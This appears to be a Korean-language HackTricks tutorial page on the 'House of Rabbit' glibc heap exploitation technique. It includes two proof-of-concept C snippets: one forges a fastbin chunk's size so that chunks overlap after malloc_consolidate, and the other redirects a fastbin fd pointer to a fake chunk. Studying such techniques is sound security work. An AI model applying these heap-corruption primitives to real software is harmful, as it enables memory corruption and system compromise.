# House of Rabbit

{{#include ../../banners/hacktricks-training.md}}

### Requirements

1. **빠른 빈 fd 포인터 또는 크기를 수정할 수 있는 능력**: 이는 빠른 빈의 청크의 전방 포인터 또는 크기를 변경할 수 있음을 의미합니다.
2. **`malloc_consolidate`를 트리거할 수 있는 능력**: 이는 큰 청크를 할당하거나 상단 청크를 병합하여 힙이 청크를 통합하도록 강제함으로써 수행할 수 있습니다.

### Goals

1. **겹치는 청크 만들기**: 하나의 청크가 다른 청크와 겹치도록 하여 추가적인 힙 조작을 가능하게 합니다.
2. **가짜 청크 위조하기**: 할당자를 속여 힙 작업 중에 가짜 청크를 합법적인 청크로 취급하게 합니다.

## Steps of the attack

### POC 1: 빠른 빈 청크의 크기 수정

**목표**: 빠른 빈 청크의 크기를 조작하여 겹치는 청크를 만듭니다.

- **1단계: 청크 할당**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
우리는 각각 0x40 바이트 크기의 두 개의 청크를 할당합니다. 이 청크는 해제되면 빠른 빈 목록에 배치됩니다.

- **2단계: 청크 해제**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
두 청크를 해제하여 fastbin 목록에 추가합니다.

- **3단계: 청크 크기 수정**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
`chunk1`의 크기 메타데이터를 0xa1로 변경합니다. 이는 통합 중에 할당자를 속이는 중요한 단계입니다.

- **4단계: `malloc_consolidate` 트리거**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
큰 청크를 할당하면 `malloc_consolidate` 함수가 호출되어 빠른 빈의 작은 청크가 병합됩니다. 조작된 `chunk1`의 크기로 인해 `chunk1`이 `chunk2`와 겹치게 됩니다.

병합 후, `chunk1`은 `chunk2`와 겹쳐 추가적인 악용이 가능합니다.

### POC 2: `fd` 포인터 수정

**목표**: 빠른 빈 `fd` 포인터를 조작하여 가짜 청크를 생성합니다.

- **1단계: 청크 할당**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**설명**: 우리는 가짜 청크를 설정하기 위해 하나는 더 작고 하나는 더 큰 두 개의 청크를 할당합니다.

- **단계 2: 가짜 청크 만들기**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
`chunk2`에 가짜 청크 메타데이터를 작성하여 더 작은 청크를 시뮬레이션합니다.

- **3단계: `chunk1` 해제**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**설명**: 우리는 `chunk1`을 해제하여 fastbin 목록에 추가합니다.

- **단계 4: `chunk1`의 `fd` 수정**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**설명**: 우리는 `chunk1`의 포워드 포인터(`fd`)를 `chunk2` 내부의 가짜 청크를 가리키도록 변경합니다.

- **단계 5: `malloc_consolidate` 트리거하기**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
큰 청크를 다시 할당하면 `malloc_consolidate`가 트리거되어 가짜 청크를 처리합니다.

가짜 청크는 fastbin 목록의 일부가 되어 추가적인 악용을 위한 합법적인 청크가 됩니다.

### 요약

**House of Rabbit** 기법은 fast bin 청크의 크기를 수정하여 겹치는 청크를 생성하거나 `fd` 포인터를 조작하여 가짜 청크를 생성하는 것을 포함합니다. 이를 통해 공격자는 힙에서 합법적인 청크를 위조할 수 있어 다양한 형태의 악용이 가능해집니다. 이러한 단계를 이해하고 연습하면 힙 악용 기술이 향상됩니다.

{{#include ../../banners/hacktricks-training.md}}
